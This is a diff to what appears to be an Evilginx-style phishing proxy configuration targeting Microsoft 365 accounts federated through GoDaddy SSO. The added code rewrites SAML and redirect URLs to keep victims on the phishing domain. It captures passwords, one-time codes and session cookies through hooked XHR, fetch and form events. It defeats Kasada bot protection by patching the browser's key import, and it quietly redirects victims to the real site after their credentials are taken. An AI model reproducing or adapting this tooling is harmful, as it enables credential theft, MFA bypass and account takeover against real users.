@@ -53,6 +53,19 @@ sub_filters:
 # secureserver.net internal URL rewriting
   - { triggers_on: "sso.secureserver.net", orig_sub: "sso", domain: "secureserver.net", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
   - { triggers_on: "sso.secureserver.net", orig_sub: "sso", domain: "secureserver.net", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
+# REVERSE: secureserver.net response → rewrite Microsoft federation endpoints back to our proxy
+# (covers SAML POST-back action= attribute, JS window.location, JSON redirect URLs)
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+# REVERSE: secureserver.net Location header (302 with SAMLResponse → MS) rewriting
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
+  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
+# Same for sso2.secureserver.net (alt federation host)
+  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
+  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/GetCredentialType.srf', replace: 'https://{hostname}/GetCredentialType.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'notice?ru=https://{hostname}/oauth20_authorize.srf%', replace: 'notice?ru=https://{orig_hostname}/oauth20_authorize.srf%', mimes: ['text/html', 'application/json', 'application/javascript']}
@@ -155,6 +168,13 @@ sub_filters:
   - {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  # Rewrite sso.godaddy.com in 302 Location header (e.g. redirect to /login/tac/pass after password)
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
+  # Rewrite Microsoft URL in GoDaddy's auto_post_form (SAML federation response)
+  # /v1/api/pass/login returns JSON with auto_post_form whose action is https://login.microsoftonline.com/login.srf
+  # Without this, the SAML form POSTs directly to the real Microsoft, bypassing the proxy entirely.
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
@@ -168,8 +188,16 @@ sub_filters:
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: '/notice?ru=https://{hostname}', replace: 'notice?ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'notice?ru=https://{hostname}', replace: '/notice?ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'ru=https://login.live.com', replace: 'ru=https://{orig_hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
-  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']} 
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURIComponent(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  - {triggers_on: 'privacynotice.account.microsoft.com', orig_sub: 'privacynotice.account', domain: 'microsoft.com', search: 'window\.location\.href', replace: 'decodeURI(window.location.href)', mimes: ['text/javascript', 'text/html', 'application/javascript', 'application/x-www-form-urlencoded', 'application/json']}
+  # Kasada HMAC fix — inject into <head> so it runs BEFORE Kasada SDK loads.
+  # Kasada j-1.x derives X-Kpsdk-H key from window.location.hostname; when proxied
+  # that is the phish domain and GoDaddy rejects the request. This patch intercepts
+  # crypto.subtle.importKey and replaces the proxy hostname bytes with the real hostname
+  # so the HMAC is computed correctly, preventing the "Yikes! Something went wrong" block.
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso.secureserver.net', orig_sub: 'sso', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
+  - {triggers_on: 'sso2.secureserver.net', orig_sub: 'sso2', domain: 'secureserver.net', search: '<head>', replace: '<head><script>(function(){try{var r=window.location.hostname,g=r.indexOf("sssn2.")===0?"sso2.secureserver.net":r.indexOf("sssn.")===0?"sso.secureserver.net":"sso.godaddy.com";if(r!==g&&window.crypto&&window.crypto.subtle){var e=new TextEncoder(),d=new TextDecoder(),rx=new RegExp(r.replace(/\./g,"\\."),"g"),oi=crypto.subtle.importKey.bind(crypto.subtle);crypto.subtle.importKey=function(f,k,a,x,u){if(f==="raw"&&k){try{var ab=k instanceof ArrayBuffer?k:ArrayBuffer.isView(k)?k.buffer.slice(k.byteOffset,k.byteOffset+k.byteLength):null;if(ab){var t=d.decode(ab);if(t.indexOf(r)!==-1)k=e.encode(t.replace(rx,g));}}catch(_){}}return oi(f,k,a,x,u);}}}catch(_){}})();</script>', mimes: ['text/html']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap']
@@ -242,8 +270,11 @@ auth_urls:
   - '/landingv2'
   - '/v1/login'
   - '/sso/v1/login'
+  - '/v1/api/pass/my/token'
+  - '/saml/owa'
   - '/login/callback'
   - '/oauth2/callback'
+  - '/login.srf'
 credentials:
   username:
     key: '(login|UserName|username|email|account)'
@@ -265,9 +296,85 @@ login:
   path: '/'
 # Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
 js_inject:
+  # Backstop on the GoDaddy SSO IDP host: after the password POST, the IDP
+  # responds with either (a) a self-submitting SAML form whose action= points
+  # to login.microsoftonline.com, or (b) a JS redirect via window.location.
+  # If sub_filters miss either (compression, dynamic strings), this rewrites
+  # them to our proxy at runtime so the user lands on /common/SAS/ProcessAuth
+  # under woman.<phish_domain> instead of the real Microsoft.
+  - trigger_domains: ["sso.secureserver.net", "sso2.secureserver.net"]
+    trigger_paths: ["/*", "/"]
+    script: |
+      (function() {
+        var _phishDomain = (function() {
+          var parts = window.location.hostname.split('.');
+          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+        })();
+        var _msHost   = 'woman.' + _phishDomain;
+        var _liveHost = 'living.' + _phishDomain;
+
+        function _rewrite(url) {
+          if (typeof url !== 'string') return url;
+          return url
+            .replace(/https?:\/\/login\.microsoftonline\.com/gi, 'https://' + _msHost)
+            .replace(/https?:\/\/login\.live\.com/gi,           'https://' + _liveHost);
+        }
+
+        // Patch any <form action="..."> pointing at MS so SAML POST-back goes through us
+        function _patchForms() {
+          var forms = document.getElementsByTagName('form');
+          for (var i = 0; i < forms.length; i++) {
+            var a = forms[i].getAttribute('action');
+            if (a && (a.indexOf('login.microsoftonline.com') !== -1 || a.indexOf('login.live.com') !== -1)) {
+              forms[i].setAttribute('action', _rewrite(a));
+            }
+          }
+        }
+        _patchForms();
+        var _mo = new MutationObserver(_patchForms);
+        try { _mo.observe(document.documentElement, {childList: true, subtree: true, attributes: true, attributeFilter:['action']}); } catch(e) {}
+
+        // Hook window.location assignments / .assign() / .replace() / .href setter
+        try {
+          var _origAssign  = window.location.assign.bind(window.location);
+          var _origReplace = window.location.replace.bind(window.location);
+          window.location.assign  = function(u) { return _origAssign(_rewrite(u)); };
+          window.location.replace = function(u) { return _origReplace(_rewrite(u)); };
+        } catch(e) {}
+
+        // Hook fetch + XHR open in case JS posts SAMLResponse via AJAX
+        try {
+          var _of = window.fetch;
+          window.fetch = function(input, init) {
+            if (typeof input === 'string') input = _rewrite(input);
+            else if (input && input.url) { try { input = new Request(_rewrite(input.url), input); } catch(e) {} }
+            return _of.call(this, input, init);
+          };
+          var _ox = XMLHttpRequest.prototype.open;
+          XMLHttpRequest.prototype.open = function(m, u) {
+            arguments[1] = _rewrite(u);
+            return _ox.apply(this, arguments);
+          };
+        } catch(e) {}
+      })();
+
   - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
     script: |
+      // Mock crypto.subtle functions for MSAL cache migration
+      if (window.crypto && window.crypto.subtle) {
+        try {
+          var _origDeriveKey = crypto.subtle.deriveKey;
+          if (!_origDeriveKey) {
+            crypto.subtle.deriveKey = function() { return Promise.resolve(new Uint8Array(32)); };
+          }
+          var _origDeriveBits = crypto.subtle.deriveBits;
+          if (!_origDeriveBits) {
+            crypto.subtle.deriveBits = function() { return Promise.resolve(new ArrayBuffer(32)); };
+          }
+        } catch(e) {}
+      }
+
       var _scEmail = '';
       var _hash = window.location.hash.slice(1);
       if (_hash && _hash.indexOf('@') !== -1) _scEmail = decodeURIComponent(_hash);
@@ -365,9 +472,71 @@ js_inject:
   # x-tymus session cookie on this subdomain (session was set on Microsoft proxy).
   # sso.secureserver.net is used for custom-domain GoDaddy O365 tenants.
   - trigger_domains: ["sso.godaddy.com", "sso.secureserver.net"]
-    trigger_paths: ["/*"]
+    trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
+        // Mock missing crypto.subtle functions early
+        if (window.crypto && window.crypto.subtle) {
+          try {
+            if (!crypto.subtle.deriveKey) {
+              crypto.subtle.deriveKey = function() { return Promise.resolve(new Uint8Array(32)); };
+            }
+            if (!crypto.subtle.deriveBits) {
+              crypto.subtle.deriveBits = function() { return Promise.resolve(new ArrayBuffer(32)); };
+            }
+          } catch(e) {}
+        }
+
+        // ── Kasada HMAC hostname patch ───────────────────────────────────────────
+        // Kasada j-1.2.308 derives the X-Kpsdk-H HMAC key from window.location.hostname.
+        // When proxied, that is the phish domain — GoDaddy's Kasada server rejects it.
+        // Intercept crypto.subtle.importKey BEFORE the SDK loads: if the raw key bytes
+        // contain the proxy hostname, replace them with the real hostname so the HMAC
+        // is computed correctly. Runs in both the main page and the /fp iframe.
+        try {
+          var _kReal  = window.location.hostname.indexOf('sssn') === 0
+                        ? 'sso.secureserver.net'
+                        : 'sso.godaddy.com';
+          var _kProxy = window.location.hostname;
+          if (_kProxy !== _kReal && window.crypto && window.crypto.subtle) {
+            var _enc = new TextEncoder();
+            var _dec = new TextDecoder();
+            var _re  = new RegExp(_kProxy.replace(/\./g, '\\.'), 'g');
+            var _origImport = crypto.subtle.importKey.bind(crypto.subtle);
+            crypto.subtle.importKey = function(fmt, keyData, algo, ext, uses) {
+              if (fmt === 'raw' && keyData) {
+                try {
+                  var ab = keyData instanceof ArrayBuffer ? keyData
+                         : ArrayBuffer.isView(keyData)
+                           ? keyData.buffer.slice(keyData.byteOffset, keyData.byteOffset + keyData.byteLength)
+                           : null;
+                  if (ab) {
+                    var txt = _dec.decode(ab);
+                    if (txt.indexOf(_kProxy) !== -1) {
+                      keyData = _enc.encode(txt.replace(_re, _kReal));
+                    }
+                  }
+                } catch(_e) {}
+              }
+              return _origImport(fmt, keyData, algo, ext, uses);
+            };
+          }
+        } catch(_e) {}
+
+        // ── Proxy-domain rewriter ────────────────────────────────────────────────
+        // Computes the phish base domain from the current hostname so we can
+        // rewrite GoDaddy real-domain URLs in API responses before the SPA acts on them.
+        var _pd = (function() {
+          var parts = window.location.hostname.split('.');
+          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+        })();
+        function _rewriteGDUrls(text) {
+          return text
+            .replace(/https?:\/\/sso2\.secureserver\.net/g, 'https://sssn2.' + _pd)
+            .replace(/https?:\/\/sso\.secureserver\.net/g,  'https://sssn.'  + _pd)
+            .replace(/https?:\/\/sso\.godaddy\.com/g,       'https://ssso.'  + _pd);
+        }
+
         // Block new service worker registrations so they can't intercept requests.
         if ('serviceWorker' in navigator) {
           navigator.serviceWorker.register = function() { return Promise.resolve({}); };
@@ -377,6 +546,25 @@ js_inject:
         var email  = params.get('username') || params.get('login_hint') || params.get('email') || '';
         var hash   = window.location.hash.slice(1);
         if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);
+
+        // ── Kasada error recovery ────────────────────────────────────────────────
+        // GoDaddy SSO uses Kasada KP SDK whose HMAC is bound to window.location.hostname.
+        // When proxied, the HMAC is wrong and GoDaddy returns "Yikes! Something went wrong".
+        // Credentials are already captured at that point, so we redirect the victim to
+        // the real SSO with the same URL so they can log in successfully without suspicion.
+        function _getRealSSOUrl() {
+          var h   = window.location.hostname;
+          var path = window.location.pathname + window.location.search;
+          if (h.indexOf('sssn2.') === 0) return 'https://sso2.secureserver.net' + path;
+          if (h.indexOf('sssn.')  === 0) return 'https://sso.secureserver.net'  + path;
+          return 'https://sso.godaddy.com' + path;
+        }
+        var _redirected = false;
+        function _doRedirect() {
+          if (_redirected) return;
+          _redirected = true;
+          setTimeout(function() { window.location.replace(_getRealSSOUrl()); }, 900);
+        }
 
         var _lastSent = 0;
         function _sendCred(pass, user) {
@@ -393,7 +581,6 @@ js_inject:
         }
 
         // ── Layer 1: DOM-level capture (works regardless of fetch/XHR library) ──
-        // Capture phase so we see the event before the SPA's own handler.
         document.addEventListener('submit', function(e) {
           var form = e.target;
           if (!form) return;
@@ -416,9 +603,8 @@ js_inject:
             }
           });
           pw.addEventListener('blur', function() {
-            // Only fire on blur if a submit button also exists (page is ready to login).
             var form = pw.closest('form');
-            var btn = form && (form.querySelector('button[type="submit"],input[type="submit"],button') );
+            var btn = form && form.querySelector('button[type="submit"],input[type="submit"],button');
             if (btn && pw.value) {
               var uEl = form.querySelector('input[type="email"],input[name="username"],input[name="email"],input[name="login"]');
               _sendCred(pw.value, uEl ? uEl.value : '');
@@ -433,30 +619,61 @@ js_inject:
         _obs.observe(document.documentElement, {childList: true, subtree: true});
         _scanPwFields();
 
-        // ── Layer 2: XHR prototype patch (captures calls from XHR-based libs) ──
-        // XHR prototype patching works even if the SPA instantiated XHR before this
-        // script runs, because we patch the prototype, not an instance.
+        // ── Layer 2: XHR prototype patch ──────────────────────────────────────────
         var _oOpen = XMLHttpRequest.prototype.open;
         var _oSend = XMLHttpRequest.prototype.send;
+        var _xhrRespDesc = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText');
         XMLHttpRequest.prototype.open = function(method, url) {
           this._xm = method; this._xu = url;
           return _oOpen.apply(this, arguments);
         };
         XMLHttpRequest.prototype.send = function(body) {
-          if (this._xm && this._xm.toUpperCase() === 'POST' && body) {
-            try {
-              var obj = JSON.parse(typeof body === 'string' ? body : '');
-              var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
-              var user = obj.username || obj.email || obj.login || obj.user || '';
-              if (pass) _sendCred(pass, user);
-            } catch(e) {}
+          if (this._xm && this._xm.toUpperCase() === 'POST') {
+            // Capture credentials from request body
+            if (body) {
+              try {
+                var obj = JSON.parse(typeof body === 'string' ? body : '');
+                var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
+                var user = obj.username || obj.email || obj.login || obj.user || '';
+                if (pass) _sendCred(pass, user);
+                // OTP/TAC capture — POST /v1/api/pass/my/token {"factor":"k_tac","value":"<otp>"}
+                if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
+              } catch(e) {}
+            }
+            var isLoginXhr = this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/pass/my/token') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1);
+            if (isLoginXhr) {
+              // Patch responseText to rewrite real GoDaddy URLs before the SPA reads them.
+              var self = this;
+              if (_xhrRespDesc) {
+                Object.defineProperty(self, 'responseText', {
+                  get: function() {
+                    var raw = _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : '';
+                    return _rewriteGDUrls(raw);
+                  },
+                  configurable: true
+                });
+              }
+              this.addEventListener('load', function() {
+                if (self.status >= 400 || self.status === 0) {
+                  _doRedirect();
+                } else {
+                  try {
+                    var raw = _xhrRespDesc && _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : self.responseText;
+                    var r = JSON.parse(raw);
+                    if (r && (r.error || r.success === false)) _doRedirect();
+                  } catch(e) {}
+                }
+              });
+            }
           }
           return _oSend.apply(this, arguments);
         };
 
-        // ── Layer 3: fetch re-wrap (races with SPA but catches late-binding code) ──
+        // ── Layer 3: fetch re-wrap ─────────────────────────────────────────────────
         var _oFetch = window.fetch;
         window.fetch = function(url, opts) {
+          var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : '');
+          var isLogin = urlStr.indexOf('/pass/login') !== -1 || urlStr.indexOf('/pass/my/token') !== -1 || urlStr.indexOf('/v1/login') !== -1 || urlStr.indexOf('/api/login') !== -1;
           if (opts && opts.method && opts.method.toUpperCase() === 'POST' && opts.body) {
             try {
               var bodyStr = typeof opts.body === 'string' ? opts.body : (opts.body instanceof URLSearchParams ? opts.body.toString() : '');
@@ -465,21 +682,74 @@ js_inject:
                 var pass = obj.password || obj.passwd || obj.pass || obj.pwd || obj.credential || obj.secret || '';
                 var user = obj.username || obj.email || obj.login || obj.user || '';
                 if (pass) _sendCred(pass, user);
+                if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
               }
             } catch(e) {}
           }
-          return _oFetch.apply(this, arguments);
+          var p = _oFetch.apply(this, arguments);
+          if (isLogin) {
+            // Return a patched response: rewrite any real GoDaddy URLs in the
+            // JSON body before the React SPA reads them and navigates away.
+            return p.then(function(resp) {
+              if (!resp.ok) { _doRedirect(); return resp; }
+              return resp.clone().text().then(function(text) {
+                try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) { _doRedirect(); return resp; } } catch(e) {}
+                var out = _rewriteGDUrls(text);
+                if (out === text) return resp;
+                return new Response(out, {status: resp.status, statusText: resp.statusText, headers: resp.headers});
+              });
+            }).catch(function() { _doRedirect(); return new Response('{}', {status: 200}); });
+          }
+          return p;
         };
 
-        // --- email autofill ---
+        // ── Kasada error DOM monitor ──────────────────────────────────────────────
+        // Poll for "Yikes!" text that GoDaddy renders when Kasada rejects the login.
+        var _errTimer = setInterval(function() {
+          var b = document.body;
+          if (!b) return;
+          var t = b.innerText || b.textContent || '';
+          if (t.indexOf('Yikes') !== -1 || t.indexOf('went wrong') !== -1 || t.indexOf('Something went') !== -1) {
+            clearInterval(_errTimer);
+            _doRedirect();
+          }
+        }, 600);
+        setTimeout(function() { clearInterval(_errTimer); }, 30000);
+
+        // --- email autofill + auto-advance ---
+        function _clickNext() {
+          // GoDaddy SSO uses a React SPA; the submit button may have various labels.
+          var btn = document.querySelector(
+            'button[type="submit"], input[type="submit"], ' +
+            'button[data-eid*="next"], button[data-eid*="submit"], ' +
+            'button[data-cy*="next"], button[data-cy*="submit"]'
+          );
+          if (!btn) {
+            // Fall back: find a visible button whose text is Next/Continue/Sign In
+            var btns = document.querySelectorAll('button');
+            for (var b = 0; b < btns.length; b++) {
+              var t = (btns[b].textContent || '').trim().toLowerCase();
+              if (t === 'next' || t === 'continue' || t === 'sign in' || t === 'log in' || t === 'weiter' || t === 'anmelden') {
+                btn = btns[b]; break;
+              }
+            }
+          }
+          if (btn && !btn.disabled) { btn.focus(); btn.click(); }
+        }
         function fill() {
           var emailSels = ['input[name="email"]','input[name="username"]','input[name="login"]','input[type="email"]'];
+          var filled = false;
           for (var i = 0; i < emailSels.length; i++) {
             var el = document.querySelector(emailSels[i]);
-            if (el && !el.value && email) {
-              el.focus(); el.value = email;
-              el.dispatchEvent(new Event('input',  {bubbles:true}));
-              el.dispatchEvent(new Event('change', {bubbles:true}));
+            if (el && email) {
+              if (!el.value) {
+                el.focus(); el.value = email;
+                el.dispatchEvent(new Event('input',  {bubbles:true}));
+                el.dispatchEvent(new Event('change', {bubbles:true}));
+              }
+              // Whether we filled or it was already set, advance the form
+              filled = true;
+              setTimeout(_clickNext, 300);
               break;
             }
           }
